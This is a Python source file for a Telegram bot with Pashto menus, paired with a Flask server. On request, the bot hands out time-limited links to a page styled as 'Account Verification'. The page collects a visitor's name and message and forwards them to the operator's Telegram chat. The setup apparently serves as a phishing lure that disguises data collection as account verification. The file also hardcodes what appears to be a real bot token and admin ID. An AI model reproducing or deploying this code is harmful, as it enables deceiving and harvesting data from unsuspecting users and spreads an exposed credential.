import time
import uuid
import threading
from flask import Flask, request, abort
import requests

from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)

# ================== CONFIG ==================
BOT_TOKEN = "8104728401:AAGnpTrjMUzkl6ddSEPHHtfgzjEcIhiLhps"
ADMIN_ID = 5887665463
BOT_CREDIT = "🤖 دا بوټ د سالار خانو لخوا جوړ شوی"

BASE_URL = "https://salarbot-production.up.railway.app"  # 👈 ستا Railway URL
LINK_EXPIRE = 86400  # 24 ساعته
# ============================================

# ========= TOKEN STORE =========
TOKENS = {}  # token: expiry_time

# ========= FLASK APP =========
app = Flask(__name__)

@app.route("/form")
def form_page():
    token = request.args.get("token")
    if not token or token not in TOKENS:
        abort(403)

    if time.time() > TOKENS[token]:
        abort(403)

    return f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Account Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {{
  font-family: Arial;
  background: #f2f2f2;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}}
.box {{
  background: white;
  padding: 20px;
  width: 100%;
  max-width: 350px;
  border-radius: 10px;
}}
input, textarea, button {{
  width: 100%;
  padding: 12px;
  margin-top: 10px;
}}
button {{
  background: #1877f2;
  color: white;
  border: none;
  border-radius: 5px;
}}
</style>
</head>
<body>

<div class="box">
<h3>Account Verification</h3>
<form method="POST" action="/submit">
<input type="hidden" name="token" value="{token}">
<input name="name" placeholder="ستاسو نوم">
<textarea name="message" placeholder="خپل متن ولیکئ"></textarea>
<button type="submit">Continue</button>
</form>
</div>

</body>
</html>
"""

@app.route("/submit", methods=["POST"])
def submit():
    token = request.form.get("token")
    name = request.form.get("name")
    message = request.form.get("message")

    if not token or token not in TOKENS:
        abort(403)

    if time.time() > TOKENS[token]:
        abort(403)

    text = (
        "📩 نوی پیغام\n\n"
        f"👤 نوم: {name}\n\n"
        f"📝 متن:\n{message}"
    )

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={"chat_id": ADMIN_ID, "text": text}
    )

    return "✅ معلومات واستول شول، مننه!"

# ========= TELEGRAM BOT =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        ["1️⃣ ترمیکس کمانډونه"],
        ["2️⃣ سالار کمانډ"],
        ["3️⃣ کورنا لیکنې"],
        ["4️⃣ چت روم"],
        ["5️⃣ ترمیکس ډاونلوډ"],
        ["6️⃣ د سالار واتساف"],
        ["7️⃣ د کورنا سوی ایدی جوړول"],
        ["8️⃣ نوی برخه"]
    ]
    await update.message.reply_text(
        f"سلام 👋\nیو انتخاب وکړئ 👇\n\n{BOT_CREDIT}",
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    )

async def demo_page(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = uuid.uuid4().hex
    TOKENS[token] = time.time() + LINK_EXPIRE

    link = f"{BASE_URL}/form?token={token}"

    await update.message.reply_text(
        "🔗 دا ستاسو شخصي لینک دی (۲۴ ساعته معتبر):\n\n"
        f"{link}\n\n"
        "هر براوزر کې یې خلاص کړه او فورم ډک کړه."
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text == "8️⃣ نوی برخه":
        await demo_page(update, context)
    else:
        await update.message.reply_text("❌ مهرباني وکړئ له مینو څخه انتخاب وکړئ")

# ========= RUN BOTH =========
def run_flask():
    app.run(host="0.0.0.0", port=8000)

def main():
    threading.Thread(target=run_flask).start()

    bot = ApplicationBuilder().token(BOT_TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Bot + Web Server Running...")
    bot.run_polling()

if __name__ == "__main__":
    main()
